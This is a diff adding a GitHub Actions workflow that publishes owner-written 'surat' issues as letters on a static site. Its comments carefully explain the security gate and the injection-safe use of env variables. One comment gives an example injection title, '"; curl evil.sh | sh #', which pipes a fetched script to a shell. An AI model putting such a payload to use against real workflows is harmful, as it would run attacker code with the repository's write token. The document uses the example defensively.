@@ -1,0 +1,153 @@
+name: Sync letters from issues
+
+# Write a letter by opening an issue labelled `surat`. This turns it into a folder
+# under src/letters/ and publishes it. See src/letters/_FORMAT.md.
+
+on:
+  issues:
+    types: [opened, edited, labeled]
+
+# Deny by default; each job asks for the least it needs.
+permissions: {}
+
+# Repo-wide, and never cancelled: two runs would race on `git push`, and half a
+# cancelled run means a letter committed but never deployed.
+concurrency:
+  group: sync-letters
+  cancel-in-progress: false
+
+jobs:
+  sync:
+    # ── THE SECURITY GATE ───────────────────────────────────────────────────────
+    # A static site has no server to check who is writing, so this is the only
+    # thing standing between the outside world and the mailbox. It is at job level
+    # on purpose: for an issue that isn't yours, not one step runs.
+    #
+    #   issue.user.login   — you WROTE it
+    #   sender.login       — you SAVED it. Easy to miss and it matters: on `edited`
+    #                        issue.user is still the original author while sender
+    #                        is whoever hit save, so without this a collaborator
+    #                        with triage rights could edit your issue and feed text
+    #                        into a job holding `contents: write`.
+    #   author_association — computed by GitHub, not spoofable. Belt and braces.
+    #   the label          — so ordinary issues aren't mistaken for letters.
+    #
+    # This fails CLOSED: move the repo to an organisation and author_association
+    # becomes MEMBER while repository_owner becomes the org, so the gate stops
+    # matching and nothing runs. That is deliberate — but it will look like a
+    # mystery bug one day, so it is written down here.
+    if: >-
+      github.event.issue.user.login == github.repository_owner &&
+      github.event.sender.login == github.repository_owner &&
+      github.event.issue.author_association == 'OWNER' &&
+      contains(github.event.issue.labels.*.name, 'surat')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write # commit the letter
+      issues: write # comment back + label
+      actions: write # dispatch deploy.yml (see "Trigger the deploy" below)
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Build the letter
+        id: build
+        # Every issue value is passed as an environment variable and NEVER
+        # interpolated into `run:`. `${{ }}` is textual substitution performed
+        # before bash starts, so a title of `"; curl evil.sh | sh #` inside a run
+        # block would execute with this job's write token. Through env: it is only
+        # ever process data that no shell parses.
+        env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          ISSUE_BODY: ${{ github.event.issue.body }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          ISSUE_CREATED: ${{ github.event.issue.created_at }}
+        run: node .github/scripts/sync-letter.mjs
+
+      - name: Commit
+        id: commit
+        env:
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          set -euo pipefail
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add -A src/letters
+          # Nothing changed — an `opened` + `labeled` double-fire lands here, and
+          # so does re-saving an issue without editing it.
+          if git diff --cached --quiet; then
+            echo 'pushed=false' >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          # Only the issue number, which is a number. Never the title.
+          git commit -m "letters: sync from issue #${ISSUE_NUMBER}"
+          git push
+          echo 'pushed=true' >> "$GITHUB_OUTPUT"
+
+      - name: Trigger the deploy
+        if: steps.commit.outputs.pushed == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+        # A push authenticated with the default GITHUB_TOKEN does NOT trigger
+        # push-triggered workflows — GitHub does that to prevent recursion. So
+        # deploy.yml would never run and the letter would sit in the repo,
+        # committed but never published. deploy.yml already declares
+        # workflow_dispatch, so dispatching it needs no change over there at all.
+        run: gh workflow run deploy.yml --ref main
+
+      - name: Comment and label
+        if: steps.commit.outputs.pushed == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          LETTER_SLUG: ${{ steps.build.outputs.letter_slug }}
+          PHOTO_COUNT: ${{ steps.build.outputs.photo_count }}
+          PHOTOS_FOUND: ${{ steps.build.outputs.photos_found }}
+        run: |
+          set -euo pipefail
+          kept="${PHOTO_COUNT:-0}"
+          found="${PHOTOS_FOUND:-0}"
+          note=''
+          if [ "$found" -gt "$kept" ]; then
+            note=" — ${found} were found, only the first ${kept} are shown"
+          fi
+          body="Published: https://pawafay.github.io/#/mail/${LETTER_SLUG}"
+          body="${body}"$'\n\n'"${kept} photo(s)${note}. Give the deploy about a minute."
+          # A missing label must not fail a run that already committed fine.
+          gh label create published --color C9A24B --description 'live on the site' || true
+          gh issue edit "$ISSUE_NUMBER" --add-label published || true
+          gh issue comment "$ISSUE_NUMBER" --body "$body"
+
+      - name: Report a failure back to the issue
+        if: failure()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          gh issue comment "$ISSUE_NUMBER" \
+            --body "Could not publish this one. Log: ${RUN_URL}" || true
+
+  # Someone else opened a `surat` issue. Runs on untrusted input, so it touches
+  # nothing: no checkout, no repo contents, no issue text — just a fixed string.
+  reject:
+    if: >-
+      github.event.action == 'opened' &&
+      contains(github.event.issue.labels.*.name, 'surat') &&
+      github.event.issue.user.login != github.repository_owner
+    runs-on: ubuntu-latest
+    permissions:
+      issues: write
+    steps:
+      # No checkout, so gh cannot infer the repo from a git remote — GH_REPO is
+      # what makes these calls resolve.
+      - env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          gh issue close "$ISSUE_NUMBER" --reason 'not planned' \
+            --comment 'This mailbox only accepts letters from the repo owner.'
